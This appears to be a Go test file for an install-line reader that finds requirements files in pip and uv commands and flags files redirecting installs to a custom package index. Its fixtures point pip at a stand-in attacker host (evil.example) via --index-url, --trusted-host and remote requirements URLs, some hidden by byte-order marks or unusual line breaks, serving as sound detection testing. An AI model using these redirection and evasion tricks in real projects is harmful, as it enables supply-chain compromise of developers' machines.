package installread

import (
	"os"
	"slices"
	"strings"
	"testing"
	"unicode/utf16"
)

// READER-REQFILE-1 (ADR-0159 round 12): the requirements-format files an install line names — a reason for
// install_check, which cannot read them — and pip's reading of such a file, which alalanet-agent's hook applies to the
// user's own. Placeholders zz-req-pkg and evil.example only.

func TestReaderReqFileNamed(t *testing.T) {
	for line, want := range map[string][]string{
		"pip install -r requirements.txt":                          {"requirements.txt"},
		"pip install -rreq.txt -c c.txt zz-req-pkg":                {"req.txt", "c.txt"},
		"pip install -Ur req.txt":                                  {"req.txt"},
		"pip install --requirement=req.txt --constraint c.txt":     {"req.txt", "c.txt"},
		"pip install --constr c.txt zz-req-pkg":                    {"c.txt"}, // optparse's abbreviation
		"pip install --build-constraint b.txt zz-req-pkg":          {"b.txt"},
		"pip install --requirements-from-script s.py":              {"s.py"},
		"python3 -m pip install -r req.txt":                        {"req.txt"},
		"pip3.12 install -r req.txt":                               {"req.txt"},
		"cd api && pip install -r requirements/dev.txt":            {"requirements/dev.txt"},
		"uv pip install -r req.txt -c c.txt --overrides o.txt":     {"req.txt", "c.txt", "o.txt"},
		"uv pip install --excludes e.txt -b b.txt zz-req-pkg":      {"e.txt", "b.txt"},
		"uv add -r requirements.txt":                               {"requirements.txt"},
		"uv pip sync requirements.txt dev.txt":                     {"requirements.txt", "dev.txt"},
		"uv pip sync -p 3.12 requirements.txt":                     {"requirements.txt"},
		"uv pip sync -- requirements.txt":                          {"requirements.txt"},
		"uv pip sync --python 3.12 requirements.txt":               {"requirements.txt"},
		"uvx --with-requirements req.txt zz-req-pkg":               {"req.txt"},
		"uv run --with-requirements req.txt server.py":             {"req.txt"},
		"uv tool install -c c.txt zz-req-pkg":                      {"c.txt"},
		"pipx install zz-req-pkg --pip-args='-r req.txt'":          {"req.txt"},
		"pip install -r https://evil.example/req.txt":              {"https://evil.example/req.txt"},
		`pip install -r "$REQ"`:                                    {"$REQ"},
		"sh -c 'pip install -r req.txt' && pip install -r req.txt": {"req.txt"},
	} {
		if got := RequirementFiles(line); !slices.Equal(got, want) {
			t.Errorf("%q: files %q, want %q", line, got, want)
		}
	}
	for _, line := range []string{
		"pip install -U zz-req-pkg", "pip install -Cbuild-dir=build .", "pip install . -C setting=x",
		"uvx ruff check -c ruff.toml", "uv tool run ruff -c x", "uv run pytest -r a", "uv run --with zz-req-pkg -- pytest -c y",
		"pip download -r req.txt", "pip freeze > requirements.txt", "npm i -r zz-req-pkg", "uv pip compile requirements.in",
		"pip install --requiremen req.txt", // --requirement and --requirements-from-script: ambiguous, pip refuses it
	} {
		if got := RequirementFiles(line); len(got) > 0 {
			t.Errorf("%q: files %q, want none", line, got)
		}
	}
}

// install_check's fact (never a reason: round 13), and the hook's reading of the line, which does not change: pip
// install -r requirements.txt stays an install form with nothing named.
func TestReaderReqFileFact(t *testing.T) {
	if f := RequirementFilesFact("pip install -r requirements.txt zz-req-pkg"); f != "requirements_file_not_read" {
		t.Errorf("fact %q", f)
	}
	if f := RequirementFilesFact("pip install zz-req-pkg"); f != "" {
		t.Errorf("no file: fact %q", f)
	}
	for _, msg := range []string{ReqFileNotRead, "installs from a requirements or constraints file"} {
		if c := UnreadCode(msg); c == "requirements_file" || c == ReqFileNotRead {
			t.Errorf("%q is read as an unread reason (%s)", msg, c)
		}
	}
	for _, line := range []string{"pip install -r requirements.txt", "uv pip sync requirements.txt", "uv add -r requirements.txt"} {
		tg, un, _, s := ParseLine(line)
		if len(tg) > 0 || len(un) > 0 || len(HookExtra(line, tg, un, s)) > 0 {
			t.Errorf("%q: targets %v, unread %q: the hook's reading changed", line, tg, un)
		}
	}
	cs := Commands("cd api && pip install -r req.txt -c c.txt && npm ci")
	if len(cs) != 3 || !slices.Equal(CommandRequirementFiles(cs[1]), []string{"req.txt", "c.txt"}) ||
		CommandRequirementFiles(cs[0]) != nil || CommandRequirementFiles(cs[2]) != nil || CommandRequirementFiles(Command{}) != nil {
		t.Errorf("CommandRequirementFiles: %+v", cs)
	}
}

func TestReaderReqFileContent(t *testing.T) {
	env := func(k string) string {
		return map[string]string{"IDX": "https://evil.example/simple", "PUB": "https://pypi.org/simple"}[k]
	}
	for text, code := range map[string]string{
		"--index-url https://evil.example/simple\nzz-req-pkg\n":                               "custom_registry",
		"-i https://evil.example/simple\n":                                                    "custom_registry",
		"-ihttps://evil.example/simple\n":                                                     "custom_registry",
		"-ihttps://evil.example/simple https://pypi.org/simple\n":                             "custom_registry", // the attached value, not the next word
		"--index-url=https://evil.example/simple\n":                                           "custom_registry",
		"--pypi-url https://evil.example/simple\n":                                            "custom_registry", // index_url's hidden alias
		"--extra-index-url https://evil.example/simple\n":                                     "custom_registry",
		"--ex https://evil.example/simple\n":                                                  "custom_registry", // unique in the file's parser
		"--ind https://evil.example/simple\n":                                                 "custom_registry",
		"-f /srv/wheels\n":                                                                    "custom_registry",
		"--find-links=./wheels\n":                                                             "custom_registry",
		"--trusted-host evil.example\n":                                                       "custom_registry",
		"--index-url \\\n  https://evil.example/simple\n":                                     "custom_registry", // joined at the backslash
		"--index-url ${IDX}\n":                                                                "custom_registry", // expanded from the environment
		"--index-url ${UNSET_IDX}\n":                                                          "custom_registry", // left as written: no public index
		"zz-req-pkg\v--index-url https://evil.example/simple\n":                               "custom_registry", // \v ends a line for pip
		"zz-req-pkg\u2028-i https://evil.example/simple\n":                                    "encoding",        // U+2028: not read (round 15)
		"zz-req-pkg\r-i https://evil.example/simple":                                          "custom_registry",
		"\xef\xbb\xbf--index-url https://evil.example/simple\n":                               "custom_registry", // UTF-8 BOM
		"\xff\xfe-\x00i\x00 \x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00e\x00v\x00i\x00l\x00/\x00": "custom_registry", // UTF-16LE, decoded
		"\xff\xfe-\x00i":                                            "encoding", // an odd length fails pip's decoding
		"# -*- coding: koi8-r -*-\nzz-req-pkg\n":                    "encoding", // a coding this reading does not decode
		"zz-req-pkg  # caf\xe9\n-i https://evil.example/simple\n":   "encoding", // no UTF-8: not read (round 15, an allowlist)
		"zz-req-pkg\x85-i https://evil.example/simple\n":            "encoding",
		"zz-req-pkg\n\xa0-i https://evil.example/simple\n":          "encoding",
		"--index-url https://evil.example/s\xe9\n":                  "encoding",
		"zz-req-pkg\u0085--index-url https://evil.example/simple\n": "encoding", // UTF-8 U+0085, U+2028, U+2029: not read
		"zz-req-pkg # \u2028\n":                                     "encoding",
		"# -*- coding: latin-1 -*-\nzz-req-pkg\n":                   "encoding",
		"--no-index -f /srv/wheels zz-req-pkg\n":                    "custom_registry",
	} {
		reasons, _ := ReqFileReasons([]byte(text), env)
		if len(reasons) == 0 || code == "encoding" && !strings.Contains(reasons[0], "encoding") || code != "encoding" && UnreadCode(reasons[0]) != code {
			t.Errorf("%q: reasons %q, want %s", text, reasons, code)
		}
	}
	for _, text := range []string{
		"zz-req-pkg==1.0\n# --index-url https://evil.example/simple\n",
		"zz-req-pkg  # -i https://evil.example/simple\n",
		"zz-req-pkg --index-url https://evil.example/simple\n", // a requirement line: pip uses its --hash and --config-settings only
		"--index-url https://pypi.org/simple\n--extra-index-url ${PUB}\n",
		"zz-req-pkg --hash=sha256:00\n-e .\n--prefer-binary\n--no-index\n",
		"# coding: utf-8\nzz-req-pkg\n",
		"",
		"zz-req-pkg#egg\n",                                   // a "#" inside a word is no comment, and no option either
		"# R\u00e9sum\u00e9 of the stack\nzz-req-pkg==1.0\n", // UTF-8 in a comment
		"--pre -- --index-url https://evil.example/simple\n", // optparse: after "--" an argument, no option
	} {
		if reasons, _ := ReqFileReasons([]byte(text), env); len(reasons) > 0 {
			t.Errorf("%q: reasons %q, want none", text, reasons)
		}
	}
	_, files := ReqFileReasons([]byte("-r base.txt\n-c constraints.txt\n--requirement=more.txt\n-rdev.txt\nzz-req-pkg -r not-this.txt\n-r ${ZZ_D}/x.txt\n"),
		func(k string) string { return map[string]string{"ZZ_D": "sub"}[k] })
	if !slices.Equal(files, []ReqFile{{"base.txt", "base.txt"}, {"constraints.txt", "constraints.txt"}, {"more.txt", "more.txt"},
		{"dev.txt", "dev.txt"}, {"sub/x.txt", "a file named through ${ZZ_D} in the file"}}) {
		t.Errorf("nested files %q", files)
	}
}

// pip's preprocess, piece by piece: str.splitlines, join_lines, COMMENT_RE, expand_env_variables.
func TestReaderReqFileLines(t *testing.T) {
	if got := pySplitLines("a\nb\r\nc\rd\ve\ff\x1cg\x1dh\x1ei\u0085j\u2028k\u2029l\x1fm"); !slices.Equal(got,
		[]string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l\x1fm"}) {
		t.Errorf("splitlines: %q", got)
	}
	for in, want := range map[string][]string{
		"a \\\nb\nc":            {"a b", "c"},
		"a\\\\\nb":              {"ab"},
		"a \\\n# c \\\nd":       {"a", "d"}, // the comment ends the joined line
		"a \\":                  {"a"},
		"  x  # y\n#z\n\n  \t":  {"x"},
		"x#y\nx\t#y\nx\u3000#y": {"x#y", "x", "x"},
		"#a\n  #b \\\nc":        {"c"},
		"-i\\\n#x":              {"-i"}, // a comment line ends the join with a blank before it
		"x\x1f#y":               {"x"},  // U+001F is a blank to Python, not a line end
	} {
		if got := reqFileLines(in); !slices.Equal(got, want) {
			t.Errorf("reqFileLines(%q) = %q, want %q", in, got, want)
		}
	}
	env := func(k string) string { return map[string]string{"A": "1", "B_2": "two", "a": "lower"}[k] }
	if got := expandReqEnv("${A}${B_2}${a}${C}$A", env); got != "1two${a}${C}$A" {
		t.Errorf("expand: %q", got)
	}
	if !reqCommentLine("\t\x1f\u3000#x") || reqCommentLine("x #y") || !reqCommentLine("#") {
		t.Error("reqCommentLine")
	}
	if reqComment("#x") != "" || reqComment("x #y") != "x" || reqComment("x#y") != "x#y" {
		t.Error("reqComment")
	}
	if got := expandReqEnv("${A}", nil); got != "${A}" {
		t.Errorf("expand without an environment: %q", got)
	}
	for in, ok := range map[string]bool{"x": true, "\xef\xbb\xbfx": true, "\xef\xbb\xbf\xff": false, "\xfe\xff": true,
		"\x00\x00\xfe\xff": true, "# coding=UTF_8\nx": true, "x\n# coding: koi8-r\n": false, "x\ny\n# coding: koi8-r": true,
		"#!/x\n# vim: set fileencoding=ascii": true, "# coding: utf-8\n\xff": false, "# coding: latin-1\nx": false, "x\xe9": false,
		"x\u0085": false, "x\u2028": false, "x\u2029": false, "\xff\xfe\x85\x00": false, "x\v\f\x1c": true} {
		if _, got := reqFileText([]byte(in)); got != ok {
			t.Errorf("reqFileText(%q): %v, want %v", in, got, ok)
		}
	}
}

// uv pip sync is an install form: the index its options name is read as an install's, and its file words are no
// packages (they were not read at all before).
func TestReaderReqFileUvPipSync(t *testing.T) {
	if _, codes := codesOn("uv pip sync --index-url https://evil.example/simple requirements.txt"); !slices.Contains(codes, "custom_registry") {
		t.Errorf("uv pip sync with an index: codes %v", codes)
	}
	for _, line := range []string{"uv pip sync requirements.txt", "uv pip sync -p 3.12 req.txt dev.txt", "uv pip sync --index-url https://pypi.org/simple r.txt"} {
		if tg, un, _, _ := ParseLine(line); len(tg) > 0 || len(un) > 0 {
			t.Errorf("%q: targets %v, unread %q", line, tg, un)
		}
	}
}

// Round 13 (P2-3): pip decodes a requirements file by its byte-order mark first — UTF-8, UTF-32 (little-endian here),
// UTF-32-BE, UTF-16 (little-endian here), UTF-16-BE — and the generic codecs take a second mark as their own.
func TestReaderReqFileDecoding(t *testing.T) {
	text := "zz-req-pkg==1.0\r\n-i https://evil.example/simple\r\n"
	enc16 := func(be bool) []byte {
		var b []byte
		for _, u := range utf16.Encode([]rune(text)) {
			if be {
				b = append(b, byte(u>>8), byte(u))
			} else {
				b = append(b, byte(u), byte(u>>8))
			}
		}
		return b
	}
	enc32 := func(be bool) []byte {
		var b []byte
		for _, r := range text {
			if be {
				b = append(b, 0, byte(r>>16), byte(r>>8), byte(r))
			} else {
				b = append(b, byte(r), byte(r>>8), byte(r>>16), 0)
			}
		}
		return b
	}
	for name, data := range map[string][]byte{
		"utf-16 le":                append([]byte{0xff, 0xfe}, enc16(false)...),
		"utf-16 be":                append([]byte{0xfe, 0xff}, enc16(true)...),
		"utf-32 le":                append([]byte{0xff, 0xfe, 0, 0}, enc32(false)...),
		"utf-32 be":                append([]byte{0, 0, 0xfe, 0xff}, enc32(true)...),
		"utf-16, a second mark BE": append([]byte{0xff, 0xfe, 0xfe, 0xff}, enc16(true)...),
		"utf-32, a second mark BE": append([]byte{0xff, 0xfe, 0, 0, 0, 0, 0xfe, 0xff}, enc32(true)...),
	} {
		got, ok := reqFileText(data)
		if !ok || got != text {
			t.Errorf("%s: %q ok %v", name, got, ok)
		}
		if r, _ := ReqFileReasons(data, nil); len(r) != 1 || UnreadCode(r[0]) != "custom_registry" {
			t.Errorf("%s: reasons %q", name, r)
		}
	}
	// a surrogate pair decodes; a lone one, an odd length, a value past U+10FFFF fail as in Python
	if got, ok := reqFileText([]byte{0xff, 0xfe, 0x3d, 0xd8, 0x00, 0xde}); !ok || got != "\U0001F600" {
		t.Errorf("a pair: %q %v", got, ok)
	}
	for _, b := range [][]byte{{0xff, 0xfe, 0x3d, 0xd8}, {0xff, 0xfe, 0x3d, 0xd8, 0x00, 0xe0}, {0xff, 0xfe, 0x00, 0xde, 0x41, 0}, {0xff, 0xfe, 0x41}, {0xfe, 0xff, 0xd8, 0x3d, 0, 0x41},
		{0xff, 0xfe, 0, 0, 0, 0, 0x11, 0}, {0, 0, 0xfe, 0xff, 0, 0, 0xd8, 0}, {0, 0, 0xfe, 0xff, 0, 0x41}} {
		if _, ok := reqFileText(b); ok {
			t.Errorf("% x decodes", b)
		}
	}
	// a mark-named "-be" codec keeps a second mark as a character; the generic one takes it
	if got, _ := reqFileText([]byte{0xfe, 0xff, 0xfe, 0xff, 0, 0x41}); got != "\uFEFFA" {
		t.Errorf("utf-16-be with a second mark: %q", got)
	}
	if got, _ := reqFileText([]byte{0x00, 0x00, 0xfe, 0xff, 0, 0, 0xfe, 0xff, 0, 0, 0, 0x41}); got != "\uFEFFA" {
		t.Errorf("utf-32-be with a second mark: %q", got)
	}
}

// Round 13 (P2-1): a reason never quotes a value the environment gave, only the file's own text or a written URL's
// host. The secret-shaped value is built from parts.
func TestReaderReqFileQuotesWrittenText(t *testing.T) {
	secret := "zz" + "Tok" + "_" + strings.Repeat("W", 9) + "41c0"
	env := func(k string) string {
		return map[string]string{"ZZ_S": secret, "ZZ_H": "https://" + secret + ".evil.example/"}[k]
	}
	for _, text := range []string{"--index-url ${ZZ_S}\n", "--trusted-host ${ZZ_S}\n", "-f ${ZZ_S}/w\n", "--extra-index-url ${ZZ_H}\n",
		"-i https://evil.example/${ZZ_S}\n", "-r ${ZZ_S}.txt\n", "--index-url=${ZZ_H} -r ${ZZ_S}\n"} {
		r, f := ReqFileReasons([]byte(text), env)
		if len(r) == 0 && len(f) == 0 {
			t.Errorf("%q: nothing", text)
		}
		printed := strings.Join(r, "|") // a nested file's Name is what pip opens; its Shown is what a reason quotes
		for _, x := range f {
			printed += "|" + x.Shown
		}
		if strings.Contains(printed, secret[2:12]) {
			t.Errorf("%q: the value from the environment is quoted: %q", text, printed)
		}
	}
	// written text is quoted: a URL's host, or the value as written
	r, _ := ReqFileReasons([]byte("--index-url https://evil.example/simple\n--trusted-host zz-host.example\n"), nil)
	if len(r) != 2 || !strings.Contains(r[0], "(evil.example)") || !strings.Contains(r[1], "(zz-host.example)") {
		t.Errorf("written: %q", r)
	}
	r, _ = ReqFileReasons([]byte("--index-url https://PyPI.org/simple\n-i zz-host\n"), nil) // a host's case is no matter; a word with no scheme is quoted whole
	if len(r) != 1 || !strings.Contains(r[0], "(zz-host)") {
		t.Errorf("case and no scheme: %q", r)
	}
	r, _ = ReqFileReasons([]byte("--index-url ${ZZ_S}\n"), env)
	if len(r) != 1 || !strings.Contains(r[0], "named through ${ZZ_S} in the file") {
		t.Errorf("through a variable: %q", r)
	}
}

// Real `pip freeze` output (pip 26.2.2) written as Windows PowerShell 5.1's `>` writes it — UTF-16LE with a byte-order
// mark, CRLF — which pip 26.2.2 parses to its ten requirements (testdata/pip_freeze_utf16le.txt): no reason. The same
// file with an index line added gives one.
func TestReaderReqFilePipFreezeUTF16(t *testing.T) {
	b, err := os.ReadFile("testdata/pip_freeze_utf16le.txt")
	if err != nil {
		t.Fatal(err)
	}
	if r, f := ReqFileReasons(b, nil); len(r) > 0 || len(f) > 0 {
		t.Errorf("honest UTF-16LE pip freeze: %q %v", r, f)
	}
	text, ok := reqFileText(b)
	if !ok || !strings.HasPrefix(text, "annotated-types==0.8.0\r\n") || len(reqFileLines(text)) != 10 {
		t.Errorf("decoded %q, %d lines", text, len(reqFileLines(text)))
	}
	evil := "--index-url https://evil.example/simple\r\n"
	for _, u := range utf16.Encode([]rune(evil)) {
		b = append(b, byte(u), byte(u>>8))
	}
	if r, _ := ReqFileReasons(b, nil); len(r) != 1 || UnreadCode(r[0]) != "custom_registry" {
		t.Errorf("with an index line: %q", r)
	}
}

// UvDirectory: uv's global --directory in any place the form reads its options (a runner's only before its command).
func TestReaderReqFileUvDirectory(t *testing.T) {
	for line, want := range map[string]string{
		"uv --directory sub pip install -r r.txt":           "sub",
		"uv pip install -r r.txt --directory=sub":           "sub",
		"uv pip install --python 3.12 --directory sub x":    "sub",
		"uvx --directory sub zz-req-pkg":                    "sub",
		"uvx --from zz-req-pkg --directory sub zz-bin":      "sub",
		"uvx zz-req-pkg --directory sub":                    "", // the tool's own word
		"uv run --directory sub script.py":                  "sub",
		"uv run script.py --directory sub":                  "",
		"uv tool run zz-req-pkg --directory sub":            "",
		"uv tool run --directory sub zz-req-pkg":            "sub",
		"uv pip install -r r.txt -- --directory sub":        "",
		"uv --directory":                                    "",
		"uv --directory a pip install --directory=b -r r.x": "b",
		"pip install --directory sub -r r.txt":              "", // not uv
	} {
		cs := Commands(line)
		got, given := "", false
		if len(cs) > 0 {
			got, given = UvDirectory(cs[len(cs)-1])
		}
		if got != want || given != (want != "") {
			t.Errorf("%q: %q %v, want %q", line, got, given, want)
		}
	}
	if _, given := UvDirectory(Command{Prog: "uv"}); given {
		t.Error("no words")
	}
}

// Round 14: runuser runs a script or a command as su does (-c, -l …) or with -u USER [--] COMMAND.
func TestReaderReqFileRunuser(t *testing.T) {
	for line, want := range map[string][]string{
		"runuser -l zz -c 'pip install zz-req-pkg'":         {"pypi:zz-req-pkg"},
		"runuser -u zz -- pip install zz-req-pkg":           {"pypi:zz-req-pkg"},
		"runuser -u zz pip install zz-req-pkg":              {"pypi:zz-req-pkg"},
		"runuser --user=zz -g wheel pip install zz-req-pkg": {"pypi:zz-req-pkg"},
		"runuser zz":                     nil,
		"runuser -u zz --":               nil,
		"runuser -- zz":                  nil,
		"runuser pip install zz-req-pkg": nil, // with no -u the first word is the user, and runuser runs a shell
	} {
		if tg, _, _, _ := ParseLine(line); !slices.Equal(tg, want) {
			t.Errorf("%q: targets %v, want %v", line, tg, want)
		}
	}
	if fs := RequirementFiles("runuser -u zz -- pip install -r r.txt"); !slices.Equal(fs, []string{"r.txt"}) {
		t.Errorf("files %v", fs)
	}
}
